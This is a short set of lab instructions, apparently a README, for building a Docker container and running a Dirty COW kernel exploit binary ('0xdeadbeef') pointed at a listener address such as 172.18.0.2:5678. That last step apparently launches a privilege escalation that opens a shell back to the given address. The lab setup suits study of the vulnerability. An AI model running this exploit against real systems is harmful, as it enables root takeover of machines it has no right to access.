# Dirty COW attack

# Build the container image
docker compose build
# docker-compose build

# Start the container
docker compose run d-cow bash

# Next
cd /dirtycow
make

./0xdeadbeef IP:port
./0xdeadbeef 172.18.0.2:5678